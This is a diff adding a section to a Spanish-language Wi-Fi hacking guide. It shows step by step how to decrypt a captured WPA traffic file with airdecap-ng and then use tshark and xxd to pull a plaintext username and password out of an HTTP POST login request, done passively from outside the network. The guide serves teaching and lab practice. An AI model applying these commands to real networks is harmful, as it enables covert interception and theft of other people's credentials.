@@ -2760,6 +2760,108 @@ correcto.
 A través de la herramienta **airdecap-ng** de la suite de **aircrack**, es posible desencriptar estas capturas
 siempre y cuando se proporcione la contraseña de la red correcta.
 
+Lo hacemos de la siguiente manera:
+
+```bash
+┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #ls
+Captura-01.cap
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #airdecap-ng -e MOVISTAR_1677 -p XXXXXXXXXXXXXXXXXXXX Captura-01.cap 
+Total number of stations seen            9
+Total number of packets read          2838
+Total number of WEP data packets         0
+Total number of WPA data packets      1082
+Number of plaintext data packets         0
+Number of decrypted WEP  packets         0
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets       189
+Number of bad TKIP (WPA) packets         0
+Number of bad CCMP (WPA) packets         0
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #
+```
+
+Si nos fijamos, se han desencriptado un total de 189 paquetes WPA. Esto es así debido a que la contraseña
+proporcionada es la correcta, si hubiera puesto una que no fuera correcta no se habría desencriptado nada.
+
+Esto nos genera en el directorio actual de trabajo un nuevo fichero:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #ls
+Captura-01.cap  Captura-01-dec.cap
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #
+```
+
+Sobre el cual podremos hacer los filtrados para visualizar el tráfico interno.
+
+#### Análisis del desencriptado con Tshark y Wireshark
+
+Realmente usaré **Tshark**, pero desde **Wireshark** obtendríamos los mismos resultados. Intentemos ver ahora
+si somos capaces de visualizar tráfico HTTP, concretamente, alguna petición POST que se haya realizado:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" 2>/dev/null
+  185  10.456181 192.168.1.55 → 46.231.127.84 HTTP 736 POST /includes/posthandler.php HTTP/1.1  (application/x-www-form-urlencoded)
+```
+
+Interesante, vemos algo. Intentemos ver si somos capaces de visualizar el payload de esta petición:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null
+50:4f:53:54:20:2f:69:6e:63:6c:75:64:65:73:2f:70:6f:73:74:68:61:6e:64:6c:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:30:35:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:58:2d:52:65:71:75:65:73:74:65:64:2d:57:69:74:68:3a:20:58:4d:4c:48:74:74:70:52:65:71:75:65:73:74:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:37:36:2e:30:2e:33:38:30:39:2e:38:37:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:3b:20:63:68:61:72:73:65:74:3d:55:54:46:2d:38:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:77:77:77:2e:61:6c:63:61:6e:7a:61:74:75:6d:65:74:61:2e:65:73:2f:6c:6f:67:69:6e:2e:70:68:70:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:73:2d:45:53:2c:65:73:3b:71:3d:30:2e:39:2c:65:6e:3b:71:3d:30:2e:38:2c:6a:61:3b:71:3d:30:2e:37:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:65:32:64:36:30:65:65:37:63:37:63:65:34:32:64:34:65:39:37:31:37:30:33:65:37:62:38:38:35:34:36:34:0d:0a:0d:0a:75:73:65:72:6e:61:6d:65:3d:73:34:76:69:74:61:72:26:70:61:73:73:77:6f:72:64:3d:6d:69:50:61:73:73:77:6f:72:64:49:6d:70:6f:73:69:62:6c:65:64:65:4f:62:74:65:6e:65:72:26:74:6f:6b:65:6e:3d:66:34:35:65:36:32:30:61:62:33:64:34:63:62:30:30:61:35:34:33:66:37:33:37:37:64:34:30:61:63:63:65:26:6c:6f:67:69:6e:3d:4c:6f:67:69:6e
+```
+
+¡Perfecto!, está en hexadecimal, pasémoslo a un formato algo más legible y veamos si podemos sacar algún dato
+en claro:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r; echo
+POST /includes/posthandler.php HTTP/1.1
+Host: www.alcanzatumeta.es
+Connection: keep-alive
+Content-Length: 105
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://www.alcanzatumeta.es
+Referer: http://www.alcanzatumeta.es/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: es-ES,es;q=0.9,en;q=0.8,ja;q=0.7
+Cookie: PHPSESSID=e2d60ee7c7ce42d4e971703e7b885464
+
+username=s4vitar&password=miPasswordImposibledeObtener&token=f45e620ab3d4cb00a543f7377d40acce&login=Login
+```
+
+Estupendo, como vemos, usuario y contraseña:
+
+```bash
+┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
+└──╼ #tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | tail -n 1 | cut -d '&' -f 1-2 | tr '&' '\n'
+username=s4vitar
+password=miPasswordImposibledeObtener
+```
+
+La elegancia de todo esto está en que no estamos haciendo un **MITM** tradicional estando asociados en la red,
+lo cual puede levantar sospechas dado que la mayoría de ataques de tipo ARP Spoofing/DNS Spoofing ya son
+detectados y alertados por la mayoría de navegadores.
+
+Este ataque lo estamos haciendo desde fuera de la red, sin estar asociados, capturando simplemente el tráfico
+que percibamos estando en modo monitor, lo cual es fascinante.
+
+**IMPORTANTE**: Para desencriptar el tráfico de un cliente, es necesario capturar un Handshake por parte de
+dicha estación. En caso contrario, no será posible desencriptar su tráfico.
+
+#### Concepto de enrutamiento
+
+
+
 
 
 
